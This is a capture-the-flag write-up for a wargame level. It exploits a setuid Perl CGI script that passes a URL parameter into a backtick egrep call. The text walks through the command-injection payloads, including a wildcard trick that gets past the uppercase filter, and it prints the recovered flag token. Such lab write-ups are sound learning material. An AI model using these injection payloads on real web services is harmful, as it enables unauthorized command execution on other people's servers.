What do we have?

	$ ll
	total 16
	dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 ./
	d--x--x--x  1 root    users    340 Aug 30  2015 ../
	-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout*
	-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc*
	-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl*
	-r-x------  1 level12 level12  675 Apr  3  2012 .profile*

A `.pl` file, with the rights of owner. Let's `cat` it:

	$ cat level12.pl 
	#!/usr/bin/env perl
	# localhost:4646
	use CGI qw{param};
	print "Content-type: text/html\n\n";

	sub t {
		$nn = $_[1];
		$xx = $_[0];
		$xx =~ tr/a-z/A-Z/; 
		$xx =~ s/\s.*//;
		@output = `egrep "^$xx" /tmp/xd 2>&1`;
		foreach $line (@output) {
			($f, $s) = split(/:/, $line);
			if($s =~ $nn) {
				return 1;
			}
		}
		return 0;
	}

	sub n {
		if($_[0] == 1) {
			print("..");
		} else {
			print(".");
		}
	} 

	n(t(param("x"), param("y")));

It's a program that takes 2 parameters in the URL, `x` and `y`, apply a filter on `x` that will put all letters in caps, and give it to an `egrep` to do some check that will, at the end, print either one or two dots.

	$ curl 'http://localhost:4646/?x=abc&y=hey'
	.
	$ echo 'ABC:abc' > /tmp/xd; curl 'http://localhost:4646/?x=abc&y=abc'
	..

We, obviously, need to inject `getflag` there. After a few unsuccessful tries of closing the call to `egrep` early (`$ curl 'http://localhost:4646/?x=abc;getflag&y=hey'`), we took notice that the shell won't find it, as it's put on caps by the `tr`. So, we copy `getflag` in the `/tmp`, as a file in caps.

	$ cp -R /bin/getflag /tmp/GETFLAG

Problem, there is still `tmp` left, so we still won't find it... During our tests, we discovered that the shell wildcard (`*`) does expand, leading to the program printing two dots instead of one.

	$ curl 'http://localhost:4646/level12.pl?x=*&y*'
	..

We didn't realised what it meant at first, but after a while, we knew what to do!

	$ curl 'http://localhost:4646/level12.pl?x=$(/*/GETFLAG)'
	..

No output... but it's running server-side, so we need to put the result in a file.

	$ echo '/bin/getflag>/tmp/o' > /tmp/E; chmod 777 /tmp/E
	$ curl 'http://localhost:4646/level12.pl?x=$(/*/E)'
	..
	$ cat /tmp/o
	Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
